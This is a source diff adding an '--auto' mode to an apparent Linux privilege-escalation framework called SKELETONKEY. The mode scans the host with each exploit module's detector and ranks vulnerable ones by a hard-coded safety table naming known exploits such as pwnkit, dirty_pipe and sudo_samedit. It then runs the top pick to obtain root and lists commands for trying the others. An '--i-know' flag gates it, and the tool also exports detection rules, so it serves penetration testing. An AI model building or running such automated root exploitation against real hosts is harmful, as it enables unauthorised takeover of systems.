@@ -20,6 +20,7 @@
 #include "core/offsets.h"
 
 #include <time.h>
+#include <sys/utsname.h>
 
 #include <getopt.h>
 #include <stdbool.h>
@@ -28,7 +29,7 @@
 #include <string.h>
 #include <unistd.h>
 
-#define SKELETONKEY_VERSION "0.4.5"
+#define SKELETONKEY_VERSION "0.5.0"
 
 static const char BANNER[] =
 "\n"
@@ -51,6 +52,11 @@ static void usage(const char *prog)
 "                        (combine with --format=auditd|sigma|yara|falco)\n"
 "  --module-info <name>  full metadata + rule bodies for one module\n"
 "                        (combine with --json for machine-readable output)\n"
+"  --auto                scan host, rank vulnerable modules by safety, run the\n"
+"                        safest exploit. Requires --i-know. The 'one command\n"
+"                        that gets you root' mode — picks structural exploits\n"
+"                        (no kernel state touched) over page-cache writes over\n"
+"                        kernel primitives over races.\n"
 "  --audit               system-hygiene scan: setuid binaries, world-writable\n"
 "                        files in /etc, file capabilities, sudo NOPASSWD\n"
 "                        (complements --scan; answers 'is this box\n"
@@ -92,6 +98,7 @@ enum mode {
     MODE_DETECT_RULES,
     MODE_MODULE_INFO,
     MODE_AUDIT,
+    MODE_AUTO,
     MODE_DUMP_OFFSETS,
     MODE_HELP,
     MODE_VERSION,
@@ -654,6 +661,89 @@ static int cmd_detect_rules(enum detect_format fmt)
     return 0;
 }
 
+/* --auto: scan, rank by safety, run safest vulnerable exploit. */
+static int module_safety_rank(const char *n)
+{
+    /* Higher = safer. Run highest-ranked vulnerable module. */
+    if (!strcmp(n, "pwnkit"))                return 100; /* userspace, no kernel */
+    if (!strcmp(n, "sudoedit_editor"))       return 99;  /* structural argv */
+    if (!strcmp(n, "cgroup_release_agent"))  return 98;  /* structural, no offsets */
+    if (!strcmp(n, "overlayfs_setuid"))      return 97;  /* structural setuid */
+    if (!strcmp(n, "overlayfs"))             return 96;  /* userns + xattr */
+    if (!strcmp(n, "dirty_pipe"))            return 90;  /* page-cache write */
+    if (!strcmp(n, "dirty_cow"))             return 89;
+    if (!strncmp(n, "copy_fail", 9) ||
+        !strncmp(n, "dirty_frag", 10))       return 88;
+    if (!strcmp(n, "ptrace_traceme"))        return 85;  /* userspace cred race */
+    if (!strcmp(n, "sudo_samedit"))          return 80;  /* heap-tuned, may crash sudo */
+    if (!strcmp(n, "af_unix_gc"))            return 25;  /* kernel race, low win% */
+    if (!strcmp(n, "stackrot"))              return 15;  /* very low win% */
+    if (!strcmp(n, "entrybleed"))            return 0;   /* leak only, not LPE */
+    return 50; /* kernel primitives — middle of pack */
+}
+
+static int cmd_auto(struct skeletonkey_ctx *ctx)
+{
+    if (!ctx->authorized) {
+        fprintf(stderr,
+"[-] --auto requires --i-know. About to attempt root via the safest available\n"
+"    LPE on this host. Authorized testing only. See docs/ETHICS.md.\n");
+        return 1;
+    }
+    if (geteuid() == 0) {
+        fprintf(stderr, "[i] auto: already running as root; nothing to do.\n");
+        return 0;
+    }
+
+    struct utsname u; uname(&u);
+    fprintf(stderr, "[*] auto: host=%s kernel=%s arch=%s\n", u.nodename, u.release, u.machine);
+    fprintf(stderr, "[*] auto: scanning %zu modules for vulnerabilities...\n",
+            skeletonkey_module_count());
+
+    struct cand { const struct skeletonkey_module *m; int rank; } cands[64];
+    int nc = 0;
+    size_t n = skeletonkey_module_count();
+    for (size_t i = 0; i < n && nc < 64; i++) {
+        const struct skeletonkey_module *m = skeletonkey_module_at(i);
+        if (!m->detect || !m->exploit) continue;
+        skeletonkey_result_t r = m->detect(ctx);
+        if (r == SKELETONKEY_VULNERABLE) {
+            cands[nc].m = m;
+            cands[nc].rank = module_safety_rank(m->name);
+            fprintf(stderr, "[+] auto: %-22s VULNERABLE (safety rank %d)\n",
+                    m->name, cands[nc].rank);
+            nc++;
+        }
+    }
+    if (nc == 0) {
+        fprintf(stderr, "\n[-] auto: no vulnerable modules. Host appears patched.\n");
+        return 0;
+    }
+
+    /* Sort descending by rank (safest first). */
+    for (int i = 0; i < nc; i++)
+        for (int j = i + 1; j < nc; j++)
+            if (cands[j].rank > cands[i].rank) {
+                struct cand t = cands[i]; cands[i] = cands[j]; cands[j] = t;
+            }
+
+    const struct skeletonkey_module *pick = cands[0].m;
+    fprintf(stderr,
+"\n[*] auto: %d vulnerable module(s) found. Safest is '%s' (rank %d).\n"
+"[*] auto: launching --exploit %s...\n\n",
+            nc, pick->name, cands[0].rank, pick->name);
+
+    skeletonkey_result_t r = pick->exploit(ctx);
+    fprintf(stderr, "\n[*] auto: %s exploit returned %s\n", pick->name, result_str(r));
+    if (r == SKELETONKEY_EXPLOIT_OK) return 5;
+    if (r == SKELETONKEY_EXPLOIT_FAIL && nc > 1) {
+        fprintf(stderr, "[i] auto: %d more candidate(s) available — try one manually:\n", nc - 1);
+        for (int i = 1; i < nc; i++)
+            fprintf(stderr, "      skeletonkey --exploit %s --i-know\n", cands[i].m->name);
+    }
+    return (r == SKELETONKEY_EXPLOIT_FAIL) ? 3 : (int)r;
+}
+
 static int cmd_one(const struct skeletonkey_module *m, const char *op,
                    const struct skeletonkey_ctx *ctx)
 {
@@ -716,6 +806,7 @@ int main(int argc, char **argv)
         {"module-info",   required_argument, 0, 'I'},
         {"audit",         no_argument,       0, 'A'},
         {"dump-offsets",  no_argument,       0,  8 },
+        {"auto",          no_argument,       0,  9 },
         {"format",        required_argument, 0,  6 },
         {"i-know",        no_argument,       0,  1 },
         {"active",        no_argument,       0,  2 },
@@ -746,6 +837,7 @@ int main(int argc, char **argv)
         case  5 : ctx.no_color = true; break;
         case  7 : ctx.full_chain = true; break;
         case  8 : mode = MODE_DUMP_OFFSETS; break;
+        case  9 : mode = MODE_AUTO; ctx.authorized = i_know ? true : ctx.authorized; break;
         case  6 :
             if      (strcmp(optarg, "auditd") == 0) dr_fmt = FMT_AUDITD;
             else if (strcmp(optarg, "sigma")  == 0) dr_fmt = FMT_SIGMA;
@@ -772,6 +864,7 @@ int main(int argc, char **argv)
     if (mode == MODE_MODULE_INFO) return cmd_module_info(target, &ctx);
     if (mode == MODE_DETECT_RULES) return cmd_detect_rules(dr_fmt);
     if (mode == MODE_AUDIT) return cmd_audit(&ctx);
+    if (mode == MODE_AUTO) return cmd_auto(&ctx);
     if (mode == MODE_DUMP_OFFSETS) return cmd_dump_offsets(&ctx);
 
     /* --exploit / --mitigate / --cleanup all take a target */
